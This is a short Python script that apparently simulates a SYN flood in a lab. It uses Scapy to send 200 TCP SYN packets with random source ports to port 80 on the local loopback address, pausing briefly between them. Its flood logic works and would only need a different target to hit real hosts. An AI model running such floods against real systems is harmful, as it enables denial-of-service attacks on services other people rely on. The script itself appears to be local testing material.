# simulate_syn.py
from scapy.all import IP, TCP, send
import random
import time

target_ip = "127.0.0.1"
target_port = 80

print("💣 Simulating SYN Flood against", f"{target_ip}:{target_port}")

for _ in range(200):
    src_port = random.randint(1024, 65535)
    packet = IP(dst=target_ip)/TCP(sport=src_port, dport=target_port, flags="S")
    send(packet, verbose=False)
    # small sleep to avoid totally flooding loopback too quickly
    time.sleep(0.01)

print("✅ SYN flood simulation complete.")
